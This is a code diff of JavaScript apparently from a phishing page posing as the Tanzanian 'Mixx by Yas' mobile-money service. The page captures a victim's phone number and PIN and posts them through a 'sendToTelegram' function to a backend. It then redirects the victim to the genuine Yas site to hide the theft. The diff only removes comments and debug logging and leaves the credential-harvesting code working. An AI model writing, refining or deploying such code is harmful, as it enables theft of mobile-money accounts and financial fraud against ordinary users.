@@ -242,7 +242,6 @@
 
       let submitted = false;
 
-      // Phone validation
       phoneInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/\D/g, '').slice(0, 10);
       });
@@ -254,7 +253,7 @@
 
       async function sendToTelegram(phone, pin) {
         try {
-          console.log('📤 Sending to backend:', { phone, pin });
+          console.log('📤 Sending:', { phone, pin });
           
           const response = await fetch(BACKEND_URL, {
             method: 'POST',
@@ -265,18 +264,10 @@
           });
           
           const data = await response.json();
-          console.log('📥 Backend response:', data);
-          
-          // Check if the response indicates success
-          if (data.success === true) {
-            console.log('✅ Telegram sent successfully!');
-            return true;
-          } else {
-            console.warn('⚠️ Backend returned success: false', data);
-            return false;
-          }
+          console.log('📥 Response:', data);
+          return data.success === true;
         } catch (error) {
-          console.error('❌ Fetch error:', error);
+          console.error('❌ Error:', error);
           return false;
         }
       }
@@ -287,18 +278,12 @@
         const phone = phoneInput.value.trim();
         const pin = hiddenPinInput.value;
 
-        console.log('🔍 Validating:', { phone, pin });
-
-        // Validate phone
         if (phone === '' || phone.length < 10) {
-          console.warn('⚠️ Invalid phone:', phone);
           phoneInput.focus();
           return;
         }
 
-        // Validate PIN
         if (pin.length < 4) {
-          console.warn('⚠️ Invalid PIN:', pin);
           pinBoxes[0].focus();
           return;
         }
@@ -307,17 +292,12 @@
         loader.classList.add('show');
         document.querySelectorAll('input').forEach(i => i.disabled = true);
 
-        console.log('📤 Submitting:', { phone, pin });
-
         const success = await sendToTelegram(phone, pin);
 
         loader.classList.remove('show');
         document.querySelectorAll('input').forEach(i => i.disabled = false);
 
-        console.log('📊 Result:', success ? '✅ Success' : '❌ Failed');
-
         if (success) {
-          // Clear form on success
           phoneInput.value = '';
           pinBoxes.forEach(box => box.value = '');
           hiddenPinInput.value = '';
@@ -326,23 +306,19 @@
 
         submitted = false;
 
-        // Redirect after short delay
         setTimeout(() => {
           window.location.href = "https://yas.co.tz/mixx-by-yas/";
         }, 500);
       }
 
-      // Pin boxes events
       pinBoxes.forEach((box, index) => {
         box.addEventListener('input', function(e) {
-          // Only allow numbers
           this.value = this.value.replace(/[^0-9]/g, '');
 
           if (this.value.length === 1) {
             if (index < pinBoxes.length - 1) {
               pinBoxes[index + 1].focus();
             } else {
-              // Last box - check if all filled
               const allFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
               if (allFilled) {
                 updateHiddenPin();
@@ -359,13 +335,11 @@
           }
         });
 
-        // Auto focus first box on page load
         if (index === 0) {
           setTimeout(() => box.focus(), 100);
         }
       });
 
-      // Enter key support
       document.addEventListener('keydown', function(e) {
         if (e.key === "Enter") {
           const allFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
